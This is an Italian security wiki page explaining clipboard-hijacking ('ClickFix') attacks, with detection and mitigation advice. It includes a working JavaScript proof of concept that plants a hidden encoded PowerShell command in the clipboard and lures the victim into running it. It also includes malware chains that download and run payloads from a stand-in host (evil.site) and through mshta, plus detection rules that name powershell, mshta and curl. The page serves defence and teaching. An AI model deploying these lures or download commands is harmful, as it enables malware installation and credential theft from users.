# Attacchi di Clipboard Hijacking (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> "Non incollare mai nulla che non hai copiato tu stesso." – un consiglio vecchio ma ancora valido

## Panoramica

Il clipboard hijacking – noto anche come *pastejacking* – sfrutta il fatto che gli utenti copiano e incollano routine comandi senza ispezionarli. Una pagina web malevola (o qualsiasi contesto capace di JavaScript come un'applicazione Electron o Desktop) inserisce programmaticamente testo controllato dall'attaccante negli appunti di sistema. Le vittime sono incoraggiate, normalmente da istruzioni di ingegneria sociale accuratamente elaborate, a premere **Win + R** (finestra Esegui), **Win + X** (Accesso rapido / PowerShell), o aprire un terminale e *incollare* il contenuto degli appunti, eseguendo immediatamente comandi arbitrari.

Poiché **nessun file viene scaricato e nessun allegato viene aperto**, la tecnica elude la maggior parte dei controlli di sicurezza delle e-mail e dei contenuti web che monitorano allegati, macro o esecuzione diretta di comandi. L'attacco è quindi popolare nelle campagne di phishing che distribuiscono famiglie di malware di consumo come NetSupport RAT, Latrodectus loader o Lumma Stealer.

## Prova di Concetto in JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Le campagne più vecchie utilizzavano `document.execCommand('copy')`, quelle più recenti si basano sull'**Clipboard API** asincrona (`navigator.clipboard.writeText`).

## Il Flusso ClickFix / ClearFake

1. L'utente visita un sito con typo o compromesso (ad es. `docusign.sa[.]com`)
2. Il JavaScript **ClearFake** iniettato chiama un helper `unsecuredCopyToClipboard()` che memorizza silenziosamente una riga di comando PowerShell codificata in Base64 negli appunti.
3. Le istruzioni HTML dicono alla vittima di: *“Premere **Win + R**, incollare il comando e premere Invio per risolvere il problema.”*
4. `powershell.exe` viene eseguito, scaricando un archivio che contiene un eseguibile legittimo più un DLL malevolo (classico sideloading di DLL).
5. Il loader decripta fasi aggiuntive, inietta shellcode e installa persistenza (ad es. attività pianificata) – eseguendo infine NetSupport RAT / Latrodectus / Lumma Stealer.

### Esempio di Catena NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart legittimo) cerca nella sua directory `msvcp140.dll`.
* Il DLL malevolo risolve dinamicamente le API con **GetProcAddress**, scarica due binari (`data_3.bin`, `data_4.bin`) tramite **curl.exe**, li decripta usando una chiave XOR rotante `"https://google.com/"`, inietta il codice shell finale e decomprime **client32.exe** (NetSupport RAT) in `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Scarica `la.txt` con **curl.exe**
2. Esegue il downloader JScript all'interno di **cscript.exe**
3. Recupera un payload MSI → deposita `libcef.dll` accanto a un'applicazione firmata → sideloading DLL → shellcode → Latrodectus.

### Lumma Stealer tramite MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La chiamata **mshta** avvia uno script PowerShell nascosto che recupera `PartyContinued.exe`, estrae `Boat.pst` (CAB), ricostruisce `AutoIt3.exe` tramite `extrac32` e concatenazione di file e infine esegue uno script `.a3x` che esfiltra le credenziali del browser a `sumeriavgv.digital`.

## Rilevamento e Caccia

I blue team possono combinare il monitoraggio degli appunti, la creazione di processi e la telemetria del registro per individuare l'abuso del pastejacking:

* Registro di Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` mantiene una cronologia dei comandi **Win + R** – cerca voci insolite in Base64 / offuscate.
* ID Evento di Sicurezza **4688** (Creazione Processo) dove `ParentImage` == `explorer.exe` e `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* ID Evento **4663** per la creazione di file sotto `%LocalAppData%\Microsoft\Windows\WinX\` o cartelle temporanee subito prima dell'evento sospetto 4688.
* Sensori degli appunti EDR (se presenti) – correlare `Clipboard Write` seguito immediatamente da un nuovo processo PowerShell.

## Mitigazioni

1. Indurimento del browser – disabilitare l'accesso in scrittura agli appunti (`dom.events.asyncClipboard.clipboardItem` ecc.) o richiedere un gesto dell'utente.
2. Consapevolezza della sicurezza – insegnare agli utenti a *digitare* comandi sensibili o incollarli prima in un editor di testo.
3. Modalità Linguaggio Constraining di PowerShell / Politica di Esecuzione + Controllo delle Applicazioni per bloccare one-liner arbitrari.
4. Controlli di rete – bloccare le richieste in uscita verso domini noti per pastejacking e malware C2.

## Trucchi Correlati

* **Discord Invite Hijacking** spesso abusa dello stesso approccio ClickFix dopo aver attirato gli utenti in un server malevolo:
{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Riferimenti

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)

{{#include ../../banners/hacktricks-training.md}}
